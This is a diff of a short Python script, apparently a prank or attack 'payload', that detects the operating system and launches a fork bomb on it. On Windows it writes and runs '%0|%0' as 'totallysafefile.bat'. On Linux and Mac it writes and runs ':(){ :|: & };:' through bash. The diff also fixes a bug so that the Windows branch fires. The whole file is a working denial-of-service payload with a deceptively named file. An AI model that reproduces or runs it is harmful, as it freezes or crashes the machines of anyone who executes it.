@@ -9,27 +9,37 @@ Purpose: Way easier than trying to find the right payload, this is a catch-all a
 
 import platform, os
 
+print(platform.system())
+
 def get_platform():
     if platform.system() == 'Linux':
         return 1
+
     elif platform.system() == 'Windows':
         return 2
+
     elif platform.system() == 'Darwin':
         return 3
 
 def crash_windows():
-    os.system("%0|%0")
+    with open("totallysafefile.bat", "w+") as windows:
+        windows.write("%0|%0")
+    os.system("totallysafefile.bat")
 
 def crash_linux():
-    os.system(":(){ :|: & };:")
+    with open("file.sh", "w+") as linux:
+        linux.write(":(){ :|: & };:")
+    os.system("bash file.sh")
 
 def crash_mac():
-    os.system(":(){ :|: & };:") #the same thing as linux because you can run bash commands on mac
+    with open("file.sh", "w+") as linux:
+        linux.write(":(){ :|: & };:")
+    os.system("bash file.sh") #the same thing as linux because you can run bash commands on mac
 
 if get_platform() == 1:
     crash_linux()
-elif get_platform == 2:
+elif get_platform() == 2:
     crash_windows()
-else:
+elif get_platform() == 3:
     crash_mac()
 
